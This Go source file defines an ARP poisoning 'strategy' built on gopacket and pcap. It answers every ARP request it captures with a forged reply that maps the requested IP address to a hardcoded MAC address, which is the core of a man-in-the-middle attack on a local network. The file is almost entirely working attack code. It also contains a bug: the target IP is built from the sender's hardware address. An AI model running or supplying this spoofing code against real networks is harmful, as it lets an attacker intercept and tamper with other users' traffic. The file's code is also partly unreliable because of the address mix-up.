package strategies

import (
	"encoding/hex"
	"fmt"
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	options gopacket.SerializeOptions
)

// ARPPoison takes care of handling ARP frames
// And displays info to users.
type ARPPoison struct {
	handle *pcap.Handle
}

// Handle ..
func (strategy ARPPoison) Handle(packet gopacket.Packet) {
	arpLayer := packet.Layer(layers.LayerTypeARP)
	if arpLayer != nil {
		arp := arpLayer.(*layers.ARP)
		if arp.Operation == layers.ARPRequest {
			log.Printf("Who has %v? Tell %v", net.IP(arp.DstProtAddress), net.IP(arp.SourceProtAddress))
			arpReply := makeARPReply(arp)
			fmt.Println(hex.Dump(arpReply))
			strategy.handle.WritePacketData(arpReply)
		} else {
			fmt.Println("ARP not a Request")
		}
	}
}

func makeARPReply(arp *layers.ARP) []byte {
	tellIP := net.IP(arp.SourceHwAddress)
	tellMac := net.HardwareAddr(arp.SourceHwAddress)

	myMac := net.HardwareAddr{0x20, 0xC9, 0xD0, 0x48, 0xBE, 0x4F}
	//myIP := net.IP("192.168.175.186")

	ethernetLayer := &layers.Ethernet{
		// TODO: don't hardcode this
		SrcMAC:       myMac,
		DstMAC:       tellMac,
		EthernetType: layers.EthernetTypeARP,
	}
	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   myMac,
		SourceProtAddress: arp.DstProtAddress,
		DstHwAddress:      tellMac,
		DstProtAddress:    tellIP,
		HwAddressSize:     0x06,
		ProtAddressSize:   0x04,
	}

	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer, options,
		ethernetLayer,
		arpLayer,
	)
	return buffer.Bytes()
}
